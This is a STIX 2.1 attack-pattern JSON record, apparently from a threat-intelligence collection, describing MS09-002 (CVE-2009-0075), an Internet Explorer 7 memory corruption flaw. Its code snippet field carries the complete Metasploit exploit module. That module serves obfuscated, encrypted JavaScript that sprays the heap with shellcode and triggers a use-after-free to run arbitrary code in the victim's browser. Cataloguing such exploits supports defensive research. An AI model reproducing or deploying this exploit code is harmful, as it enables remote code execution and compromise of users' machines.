{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bef6b61a-599c-4808-be81-5f184db6093c",
    "created": "2024-08-14T16:41:11.56228Z",
    "modified": "2024-08-14T16:41:11.562284Z",
    "name": "MS09-002 Microsoft Internet Explorer 7 CFunctionPointer Uninitialized Memory Corruption",
    "description": " This module exploits an error related to the CFunctionPointer function when attempting to access uninitialized memory. A remote attacker could exploit this vulnerability to corrupt memory and execute arbitrary code on the system with the privileges of the victim.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms09_002_memory_corruption.rb",
            "external_id": "ms09_002_memory_corruption.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0075"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  #\n  # Superceded by ms10_018_ie_behaviors, disable for BrowserAutopwn\n  #\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #\t:ua_name    => HttpClients::IE,\n  #\t:ua_minver  => \"7.0\",\n  #\t:ua_maxver  => \"7.0\",\n  #\t:javascript => true,\n  #\t:os_name => OperatingSystems::Match::WINDOWS,\n  #\t:vuln_test  => nil, # no way to test without just trying it\n  #})\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS09-002 Microsoft Internet Explorer 7 CFunctionPointer Uninitialized Memory Corruption',\n      'Description'    => %q{\n        This module exploits an error related to the CFunctionPointer function when attempting\n        to access uninitialized memory. A remote attacker could exploit this vulnerability to\n        corrupt memory and execute arbitrary code on the system with the privileges of the victim.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'dean [at] zerodaysolutions [dot] com' ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-0075' ],\n          [ 'OSVDB', '51839' ],\n          [ 'MSB', 'MS09-002' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP2-SP3 / Windows Vista SP0 / IE 7', { 'Ret' => 0x0C0C0C0C } ]\n        ],\n      'DisclosureDate' => '2009-02-10',\n      'DefaultTarget'  => 0))\n\n    @javascript_encode_key = rand_text_alpha(rand(10) + 10)\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n\n    if (!request.uri.match(/\\?\\w+/))\n      send_local_redirect(cli, \"?#{@javascript_encode_key}\")\n      return\n    end\n\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Set the return.\n    ret     = Rex::Text.to_unescape([target.ret].pack('V'))\n\n    # Randomize the javascript variable names.\n    rand1   = rand_text_alpha(rand(100) + 1)\n    rand2   = rand_text_alpha(rand(100) + 1)\n    rand3   = rand_text_alpha(rand(100) + 1)\n    rand4   = rand_text_alpha(rand(100) + 1)\n    rand5   = rand_text_alpha(rand(100) + 1)\n    rand6   = rand_text_alpha(rand(100) + 1)\n    rand7   = rand_text_alpha(rand(100) + 1)\n    rand8   = rand_text_alpha(rand(100) + 1)\n    rand9   = rand_text_alpha(rand(100) + 1)\n    rand10  = rand_text_alpha(rand(100) + 1)\n    rand11  = rand_text_alpha(rand(100) + 1)\n    rand12  = rand_text_alpha(rand(100) + 1)\n    rand13  = rand_text_alpha(rand(100) + 1)\n    fill    = rand_text_alpha(25)\n\n    js = %Q|\nvar #{rand1} = unescape(\"#{shellcode}\");\nvar #{rand2} = new Array();\nvar #{rand3} = 0x100000-(#{rand1}.length*2+0x01020);\nvar #{rand4} = unescape(\"#{ret}\");\nwhile(#{rand4}.length<#{rand3}/2)\n{#{rand4}+=#{rand4};}\nvar #{rand5} = #{rand4}.substring(0,#{rand3}/2);\ndelete #{rand4};\nfor(#{rand6}=0;#{rand6}<0xC0;#{rand6}++) {#{rand2}[#{rand6}] = #{rand5} + #{rand1};}\nCollectGarbage();\nvar #{rand7} = unescape(\"#{ret}\"+\"#{fill}\");\nvar #{rand8} = new Array();\nfor(var #{rand9}=0;#{rand9}<1000;#{rand9}++)\n#{rand8}.push(document.createElement(\"img\"));\nfunction #{rand10}()\n{\n#{rand11} = document.createElement(\"tbody\");\n#{rand11}.click;\nvar #{rand12} = #{rand11}.cloneNode();\n#{rand11}.clearAttributes();\n#{rand11}=null;\nCollectGarbage();\nfor(var #{rand13}=0;#{rand13}<#{rand8}.length;#{rand13}++)\n#{rand8}[#{rand13}].src=#{rand7};\n#{rand12}.click;\n}\nwindow.setTimeout(\"#{rand10}();\",800);\n|\n    js = encrypt_js(js, @javascript_encode_key)\n\n    content = %Q|<html>\n<script language=\"JavaScript\">\n#{js}\n</script>\n</html>\n|\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-02-10",
    "x_mitre_platforms": [
        "win'"
    ]
}